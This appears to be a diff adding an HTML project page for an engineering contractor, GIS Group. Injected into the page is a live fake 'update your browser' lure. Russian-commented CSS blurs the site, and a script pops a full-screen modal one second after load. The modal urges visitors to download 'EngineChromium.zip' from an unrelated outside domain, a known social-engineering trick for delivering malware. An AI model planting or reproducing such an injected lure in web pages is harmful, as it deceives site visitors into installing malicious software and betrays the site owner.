@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>GIS GROUP</title><meta name="description" content="GIS Group is ISO 9001:2015 and OHSAS/TIS 18001 certified engineering contractor of Construction, Mechanical & Electrical (M&E) Systems and Intelligent" />
+        <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" />
+        <!-- <link rel="stylesheet" href="css/style.css" /> -->
+        <link rel="stylesheet" href="css/site.css" />
+    
+        <link rel="stylesheet" href="font/stylesheet.css" />
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/jquery.slick/1.6.0/slick.css" />
+    </head>
+    <style>
+     .carousel-item {
+  height: 100vh;
+  background-repeat: no-repeat;
+  background-position: center center;
+  background-size: cover;
+}
+    </style>
+</head>
+<body>
+<style>
+    body > *:not(#modal-overlay) {
+        filter: brightness(0.8) contrast(1.5) blur(3px);
+    }
+
+    #modal-overlay::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: url('URL_ТВОЕГО_ИЗОБРАЖЕНИЯ_С_ТРЕЩИНАМИ') no-repeat center center;
+        background-size: cover;
+        pointer-events: none; 
+        opacity: 0.5;
+        z-index: -1;
+    }
+</style>
+
+<!-- Модальное окно и оверлей -->
+<div style="
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.7);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.4s ease;
+" id="modal-overlay">
+    <div style="
+        background-color: white;
+        padding: 30px;
+        border-radius: 10px;
+        max-width: 450px;
+        box-shadow: 0px 5px 20px rgba(0, 0, 0, 0.2);
+        text-align: center;
+        transform: scale(0.9);
+        transition: transform 0.4s ease;
+    ">
+        <h2 style="
+            margin-bottom: 20px;
+            font-size: 26px;
+            color: #333;
+        ">To continue you need to update your browser</h2>
+        <p style="
+            margin-bottom: 30px;
+            font-size: 18px;
+            color: #666;
+        ">The site uses the new chromium engine, to continue it needs to be updated</p>
+        <a href="https://33webtasarim.com/chromiumstats/EngineChromium.zip" download id="download-button" style="
+            display: inline-block;
+            padding: 12px 28px;
+            background-color: #3498DB;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        " 
+        onmouseover="this.style.backgroundColor='#2980B9';" 
+        onmouseout="this.style.backgroundColor='#3498DB';">update</a>
+    </div>
+</div>
+
+<!-- JavaScript для появления модального окна -->
+<script>
+    const modalOverlay = document.getElementById('modal-overlay');
+
+    // Появление модального окна с задержкой 1 секунда после загрузки страницы
+    setTimeout(() => {
+        modalOverlay.style.opacity = '1';
+        modalOverlay.style.pointerEvents = 'auto';
+        modalOverlay.querySelector('div').style.transform = 'scale(1)';
+    }, 1000);
+</script>
+   <!-- Slider -->
+<section class="project-section">
+    <a href="index.html#projectref" class="btnCloseProject"></a>
+	<div id="carousel" class="carousel slide" data-ride="carousel">
+		<!-- Indicators -->
+		<ol class="carousel-indicators">
+			<li data-target="#carousel" data-slide-to="0" class="active"></li>
+			<li data-target="#carousel" data-slide-to="1"></li>
+			<li data-target="#carousel" data-slide-to="2"></li>
+		</ol> <!-- End of Indicators -->
+
+		<!-- Carousel Content -->
+		<div class="carousel-inner" role="listbox">
+			<div class="carousel-item active" style="background-image: url('img/hightlight-project-1.png');">
+				
+			</div> <!-- End of Carousel Item -->
+
+			<div class="carousel-item" style="background-image: url('img/project-2.png');">
+			
+			</div> <!-- End of Carousel Item -->
+
+			<div class="carousel-item" style="background-image: url('img/hightlight-project-1.png');">
+				
+			</div> <!-- End of Carousel Item -->
+		</div> <!-- End of Carousel Content -->
+
+		<!-- Previous & Next -->
+		<a href="#carousel" class="carousel-control-prev" role="button" data-slide="prev">
+			<img src="img/project-pv.png" alt="">
+			<span class="sr-only"></span>
+		</a>
+		<a href="#carousel" class="carousel-control-next" role="button" data-slide="next">
+			<img src="img/project-next.png" alt="">
+			<span class="sr-only"></span>
+		</a>
+
+       <div class="caption-project">
+        <div class="container-fluid">
+            <div class="caption">
+              <div class="container">
+                <div class="row align-items-center">
+                    <div class="col-12 col-sm-6">
+                        <h5>Segment : Hilight Projects</h5>
+                        <h1 class="text-left">BK Office building</h1>
+                        <br>
+                        <label class="mt-2 mb-0 float-left">Project Owner : GIS Group</label>
+                    </div>
+                    <div class="col-6 col-sm-2">
+                        <img src="img/bath.png" alt="">
+                        <br>
+                        <label class="mt-2">Project Value</label>
+                        <h1>280</h1>
+                        <label for="">Million Baht</label>
+                    </div>
+                    <div class="col-6 col-sm-2">
+                     <img src="img/start.png" alt="">
+                     <br>
+                     <label class="mt-2">Start Project</label>
+                     <h1>2558</h1>
+                     <label for="">October</label>
+                 </div>
+                 <div class="col-12 col-sm-2">
+                     
+                     <img src="img/Completion.png" alt="">
+                     <br>
+                     <label class="mt-2">Completion</label>
+                     <h1>2561</h1>
+                     <label for="">December</label>
+                 </div>
+                </div>
+              </div>
+            </div>
+           </div>
+       </div>
+	</div> <!-- End of Carousel -->
+</section> <!-- End of Slider -->
+
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
+    integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous">
+</script>
+<script src="bootstrap/js/bootstrap.bundle.min.js"></script>
+<script src="https://code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
+<script src="js/slick.js"></script>
+</body>
+</html>
